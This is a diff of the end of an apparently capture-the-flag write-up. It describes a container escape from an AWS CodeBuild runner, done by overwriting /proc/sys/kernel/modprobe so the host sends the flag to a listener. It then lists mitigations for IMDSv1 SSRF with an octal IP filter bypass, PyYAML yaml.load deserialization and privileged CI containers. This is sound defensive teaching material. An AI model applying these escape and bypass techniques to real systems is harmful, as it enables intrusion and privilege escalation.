-- 🔍 *Running the script triggers the CodeBuild runner, overwrites `/proc/sys/kernel/modprobe` with the host-side payload path, and fires the invalid binary execution:*
+Running the script initiates the build runner. Within seconds, the host kernel triggers our payload:
 
 ```text
 listening on [any] 9005 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.38.59] 42452
-98f499aa9ab704d5b981f1b4...
+connect to [10.10.14.70] from (UNKNOWN) [10.129.38.159] 42452
+98f499aa9ab704d5b981f1b4******
 ```
 
-- 🔍 *The root flag is received directly on our listener! Container escaped and root achieved.*
+Container escaped and host root flag retrieved!
 
 ---
 
 ## Mitigations & Security Perspective
 
-### 🔴 PyYAML Insecure Deserialization (yaml.load)
-- **Root Cause:** Utilizing `yaml.load(body, Loader=yaml.Loader)` allows arbitrary Python object instantiation and code execution when parsing untrusted messages from SQS.
-- **Remediation:** Always enforce `yaml.safe_load()` or `yaml.load(body, Loader=yaml.SafeLoader)` when processing untrusted input.
+### 🔴 AWS Metadata Service Security (SSRF & Octal Bypass)
+- **Root Cause:** Reliance on IMDSv1 allowed server-side request forgery (SSRF) without token authentication. The URL filter failed to normalize IP addresses before validation, allowing octal encoding (`0251.0376.0251.0376`) to bypass IP checks.
+- **Remediation:** Enforce **IMDSv2** (`HttpTokens=required`) requiring session token headers (`X-aws-ec2-metadata-token`). Normalize and resolve domain names and IP representations before enforcing security policies, or block the metadata subnet (`169.254.169.254/32`) at the network firewall / routing layer.
 
-### 🔴 Overprivileged AWS CodeBuild Containers (privilegedMode)
-- **Root Cause:** Granting `privilegedMode: true` in CI/CD pipeline container configurations grants the container elevated Linux capabilities (`CAP_SYS_ADMIN`), breaking container isolation.
-- **Remediation:** Disable privileged mode in CodeBuild configurations unless absolutely necessary. Employ non-root container users with strictly bounded drop-capabilities.
+### 🔴 PyYAML Insecure Deserialization (`yaml.load`)
+- **Root Cause:** Background worker utilized Python's unrestricted `yaml.load(body, Loader=yaml.Loader)` constructor to process untrusted SQS message bodies, leading to arbitrary command execution.
+- **Remediation:** Always use `yaml.safe_load(body)` or `yaml.load(body, Loader=yaml.SafeLoader)` when handling untrusted data.
 
-### 🔴 Writable /proc/sys/kernel/modprobe
-- **Root Cause:** Mounting `/proc/sys` with write permissions inside a container enables direct modification of host kernel helper hooks.
-- **Remediation:** Ensure `/proc/sys` is mounted read-only (standard in non-privileged Docker/containerd runtimes) and deploy AppArmor/SELinux profiles that prohibit kernel parameter modification.
+### 🔴 Overprivileged CI/CD Containers (`privilegedMode: true`)
+- **Root Cause:** Permitting `privilegedMode: true` in AWS CodeBuild granted containers full Linux kernel capabilities (`CAP_SYS_ADMIN`), bypassing Docker isolation boundaries.
+- **Remediation:** Prohibit privileged mode in build pipeline policies. Run build agents with least-privilege service roles and drop all unnecessary Linux capabilities.
+
+### 🔴 Writable `/proc/sys` inside Containers
+- **Root Cause:** Mounting `/proc/sys` with write permissions allows container processes to overwrite host kernel parameters such as `/proc/sys/kernel/modprobe`.
+- **Remediation:** Ensure `/proc/sys` is strictly mounted read-only and enforce SELinux, AppArmor, or Seccomp profiles prohibiting user mode helper modifications.
